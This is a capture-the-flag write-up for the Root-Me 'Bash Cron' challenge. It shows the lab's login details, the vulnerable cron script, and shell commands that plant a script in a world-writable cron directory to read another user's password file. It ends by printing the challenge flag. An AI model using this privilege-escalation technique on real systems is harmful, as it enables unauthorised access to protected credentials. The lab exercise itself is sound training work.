# Bash Cron

URL: [https://www.root-me.org/en/Challenges/App-Script/Bash-cron](https://www.root-me.org/en/Challenges/App-Script/Bash-cron)

## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                          |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                        |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                            |
| Port       | 2222                                                                                                                                                                                                                                                                                                                           |
| SSH access | [ssh -p 2222 app-script-ch4@challenge02.root-me.org](ssh://app-script-ch4:app-script-ch4@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_12&ssh=ssh://app-script-ch4:app-script-ch4@challenge02 "WebSSH") |
| Username   | app-script-ch4                                                                                                                                                                                                                                                                                                                 |
| Password   | app-script-ch4                                                                                                                                                                                                                                                                                                                 |
## Solution

```bash
app-script-ch4@challenge02:~$ ls -lhaR
.:
total 24K
dr-xr-x---  2 app-script-ch4-cracked app-script-ch4         4.0K Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4.0K Sep  5  2023 ..
-r--------  1 root                   root                    629 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
-r--r-----  1 app-script-ch4-cracked app-script-ch4-cracked   16 Dec 10  2021 .passwd
-r-xr-x---  1 app-script-ch4-cracked app-script-ch4          767 Dec 10  2021 ch4
lrwxrwxrwx  1 root                   root                     11 Dec 10  2021 cron.d -> /tmp/._cron
app-script-ch4@challenge02:~$ cat cron.d
cat: cron.d: Permission denied
app-script-ch4@challenge02:~$ cat ch4
#!/bin/bash 

# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)

# hiding stdout/stderr
exec 1>/dev/null 2>&1

wdir="cron.d/"
challdir=${0%/*}
cd "$challdir"

if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi

ls -1a "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done

rm -rf cron.d/*
```

The cronjob script above basically executes anything within `cron.d` with bash, we can write to `cron.d` directory and run scripts as cronjob user.

```bash
app-script-ch4@challenge02:~$ echo $'#!/bin/bash\ncat /challenge/app-script/ch4/.passwd > /tmp/ch4out' > cron.d/letmein.sh
app-script-ch4@challenge02:~$ chmod a+x cron.d/letmein.sh
...
app-script-ch4@challenge02:~$ cat /tmp/ch4out
Vys3OS3iStUapDj
```

> Flag: `Vys3OS3iStUapDj`

